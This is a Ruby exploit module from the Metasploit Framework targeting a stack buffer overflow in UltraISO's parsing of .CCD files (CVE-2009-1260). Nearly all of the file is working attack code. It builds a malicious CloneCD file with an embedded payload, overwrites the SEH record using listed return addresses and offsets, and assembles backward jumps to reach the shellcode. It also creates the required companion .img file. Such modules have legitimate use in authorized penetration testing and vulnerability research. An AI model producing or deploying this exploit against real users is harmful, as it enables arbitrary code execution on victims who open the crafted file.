##
# $Id: ultraiso_ccd.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'UltraISO CCD File Parsing Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in EZB Systems, Inc's
				UltraISO. When processing .CCD files, data is read from file into a
				fixed-size stack buffer. Since no bounds checking is done, a buffer overflow
				can occur. Attackers can execute arbitrary code by convincing their victim
				to open an CCD file.

				NOTE: A file with the same base name, but the extension of "img" must also
				exist. Opening either file will trigger the vulnerability, but the files must
				both exist.
			},
			'License'        => MSF_LICENSE,
			'Author' 	     => [ 'jduck' ],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2009-1260' ],
					[ 'OSVDB', '53275' ],
					[ 'BID', '34363' ],
					# NOTE: The following BID is a duplicate of BID 34363
					[ 'BID', '38613' ],
					# NOTE: The following OSVDB entry seems invalid, the IMG file doesn't appear to trigger any vulnerability.
					# [ 'OS-VDB', '53425' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/8343' ]
				],
			'Payload'        =>
				{
					'Space'       => 2048,
					'BadChars'    => "\x00\x08\x0a\x0d\x20",
					'DisableNops' => true,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested OK on:
					# v9.3.3.2685
					# v9.3.6.2750

					# The EXE base addr contains a bad char (nul). This prevents us from
					# using the super-elite multi-offset SEH exploitation method.

					[ 'Windows Universal - Double-Click/Command Line Open Method',
						{
							'Offset' => 4094,
							# NOTE: lame_enc.dll isn't loaded when opening via double-click / cmd line.
							#'Ret' => 0x10011640 # p/p/r in lame_enc.dll
							# To make matters even worse, we can't use system dlls due to Safe SEH!
							#'Ret' => 0x71b26b7e # p/p/r in mpr.dll
							'Ret' => 0x00403856 # p/p/r in unpacked UltraISO.exe (from public exploit)
						}
					],
					[ 'Windows Universal - File->Open + Toolbar Open Methods',
						{
							'Offset' => [ 5066, 5158 ],
							'Ret' => 0x10011640 # p/p/r in lame_enc.dll
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Apr 03 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.ccd']),
			], self.class)
	end

	def exploit

		print_status("Creating '#{datastore['FILENAME']}' using target '#{target.name}' ...")

		sploit = "[CloneCD]\r\n"
		sploit << "Version=3\r\n"

		sploit << "[Disc]\r\n"
		sploit << "TocEntries=4\r\n"
		sploit << "Sessions=1\r\n"
		sploit << "DataTracksScrambled=0\r\n"
		sploit << "CDTextLength=0\r\n"

		sploit << "[Session 1]\r\n"
		sploit << "PreGapMode=1\r\n"
		sploit << "PreGapSubC=0\r\n"
		sploit << "[Entry 0]\r\n"
		sploit << "Session=1\r\n"
		sploit << "Point=0xa0\r\n"
		sploit << "ADR=0x01\r\n"
		sploit << "Control=0x04\r\n"
		sploit << "TrackNo=0\r\n"
		sploit << "AMin=0\r\n"
		sploit << "ASec=0\r\n"
		sploit << "AFrame=0\r\n"
		sploit << "ALBA=-150\r\n"
		sploit << "Zero=0\r\n"
		sploit << "PMin=1\r\n"
		sploit << "PSec=0\r\n"
		sploit << "PFrame=0\r\n"
		sploit << "PLBA=4350\r\n"

		sploit << "[Entry 1]\r\n"
		sploit << "Session=1\r\n"
		sploit << "Point=0xa1\r\n"
		sploit << "ADR=0x01\r\n"
		sploit << "Control=0x04\r\n"
		sploit << "TrackNo=0\r\n"
		sploit << "AMin=0\r\n"
		sploit << "ASec=0\r\n"
		sploit << "AFrame=0\r\n"
		sploit << "ALBA=-150\r\n"
		sploit << "Zero=0\r\n"
		sploit << "PMin=1\r\n"
		sploit << "PSec=0\r\n"
		sploit << "PFrame=0\r\n"
		sploit << "PLBA=4350\r\n"

		sploit << "[Entry 2]\r\n"
		sploit << "Session=1\r\n"
		sploit << "Point=0xa2\r\n"
		sploit << "ADR=0x01\r\n"
		sploit << "Control=0x04\r\n"
		sploit << "TrackNo=0\r\n"
		sploit << "AMin=0\r\n"
		sploit << "ASec=0\r\n"
		sploit << "AFrame=0\r\n"
		sploit << "ALBA=-150\r\n"
		sploit << "Zero=0\r\n"
		sploit << "PMin=0\r\n"
		sploit << "PSec=2\r\n"
		sploit << "PFrame=34\r\n"
		sploit << "PLBA=34\r\n"

		sploit << "[Entry 3]\r\n"
		sploit << "Session=1\r\n"
		sploit << "Point=0x01\r\n"
		sploit << "ADR=0x01\r\n"
		sploit << "Control=0x04\r\n"
		sploit << "TrackNo=0\r\n"
		sploit << "AMin=0\r\n"
		sploit << "ASec=0\r\n"
		sploit << "AFrame=0\r\n"
		sploit << "ALBA=-150\r\n"
		sploit << "Zero=0\r\n"
		sploit << "PMin=0\r\n"
		sploit << "PSec=2\r\n"
		sploit << "PFrame=0\r\n"
		sploit << "PLBA=0\r\n"

		sploit << "[TRACK 1]\r\n"
		sploit << "MODE=1\r\n"
		sploit << "INDEX 1="

		idx_line = ''
		idx_line << rand_text_alphanumeric(1000) * 9

		# Stick the payload at the beginning
		idx_line[0,payload.encoded.length] = payload.encoded

		# If we have an array of offets, handle it specially
		seh_offset = target['Offset']
		if (seh_offset.is_a?(::Array))
			# Multiple offets that can be used simultaneously
			seh_offset.each { |off|
				seh = generate_seh_record(target.ret)
				distance = off + seh.length
				jmp = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string

				idx_line[off, seh.length] = seh
				idx_line[off+seh.length, jmp.length] = jmp
			}
		else
			off = seh_offset
			# We'll manually construct this double-backward jumping SEH handler frame
			distance = off - 5
			jmp1 = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
			distance = jmp1.length
			jmp2 = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
			seh = ''
			seh << jmp2
			seh << rand_text(2)
			seh << [target.ret].pack('V')
			# we can't put anything below the return address due to a potential nul byte in it

			# Add the double-back-jumping SEH frame
			idx_line[off-5, jmp1.length] = jmp1
			idx_line[off,seh.length] = seh
		end

		sploit << idx_line

		file_create(sploit)

		# create the empty IMG file
		imgfn = datastore['FILENAME'].dup
		imgfn.gsub!(/\.ccd$/, '.img')
		out = File.expand_path(File.join(datastore['OUTPUTPATH'], imgfn))
		File.new(out,"wb").close
		print_status("Created empty output file #{out}")

	end

end
